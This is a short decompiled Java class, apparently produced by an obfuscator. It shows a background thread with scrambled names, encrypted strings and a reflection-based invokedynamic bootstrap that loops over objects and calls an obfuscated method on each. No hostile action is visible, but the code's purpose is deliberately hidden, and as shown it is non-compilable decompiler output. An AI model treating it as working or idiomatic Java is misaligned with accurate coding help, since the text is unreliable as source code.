/*
 * Decompiled with CFR 0_123.
 */
import java.lang.invoke.ConstantCallSite;
import java.lang.invoke.MethodHandle;
import java.lang.invoke.MethodHandles;
import java.lang.invoke.MethodType;
import java.lang.reflect.Method;

public class pinh
extends Thread {
    public pinh() {
        this.setName(KDGY$JAHk.Y("\ub899\u7a51\u37a1\u9154\u2cff\u8289\ucdc0\u5fdb\u2039\u8f32\uc556\u49c4\u1926\u8113"));
    }

    @Override
    public void run() {
        pinh.UK(NVIs$JbpD.H("\ubde5\u1cbe\u7c70\u892f\u378c\u6cbe\u091d\uac04\u3055\uf2f1\ucb01\ucd00\u498f\u9938\uc7bb\u4812"));
        while (!pinh.interrupted()) {
            Object object;
            try {
                pinh.UK(50);
                Object object2 = pinh.UK(pinh.UK());
                while (object2.hasNext()) {
                    object = (wncc)object2.next();
                    object.AWsr();
                }
            }
            catch (Throwable throwable) {
                object = throwable;
                pinh.UK(throwable);
            }
        }
    }

    private static Object UK(Object object, Object object2, Object object3) {
        try {
            return new ConstantCallSite(((MethodHandles.Lookup)object).unreflect(yy.X(Integer.valueOf((String)object2, 32))).asType((MethodType)object3));
        }
        catch (ClassNotFoundException | IllegalAccessException reflectiveOperationException) {
            throw new BootstrapMethodError(reflectiveOperationException);
        }
    }
}

